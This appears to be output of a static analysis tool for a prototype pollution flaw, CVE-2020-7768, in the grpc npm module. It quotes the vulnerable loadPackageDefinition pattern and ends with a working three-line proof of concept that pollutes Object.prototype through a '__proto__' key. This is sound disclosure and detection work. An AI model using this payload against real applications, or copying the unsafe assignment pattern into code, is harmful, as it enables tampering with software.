// Module Name : grpc
// Version : 1.24.3
// CVE number : CVE-2020-7768
// CVSS score : 7.5 (CVSS 3.0)
// Published Date : 11 Nov, 2020

/* DAPP analysis result
[+] FileSize(Bytes) : 189648
[+] Total Time(ms) : 13178
[+] Analysis Time(ms) : 654
[+] Detected AST Pattern 1 : 1
[+] Detected AST Pattern 2 : 7
SCC generation complete
 
**********Prototype Pollution v1 found!**********
[ 10471, 10502 ] current = current [ packageName ]
[ 10559, 10590 ] current [ serviceName ]= service
*/

// Prototype pollution source code patterns detected
/*
export function loadPackageDefinition( packageDef: PackageDefinition): Grpc Object {
	...
	current = current[packageName] //AST Pattern 1
	...
	current[serviceName] = service //AST Pattern 2
	...
}
*/

// POC of CVE-2020-7768
const { loadPackageDefinition } = require('grpc')
loadPackageDefinition({'__proto__.polluted': true})
console.log(polluted) //true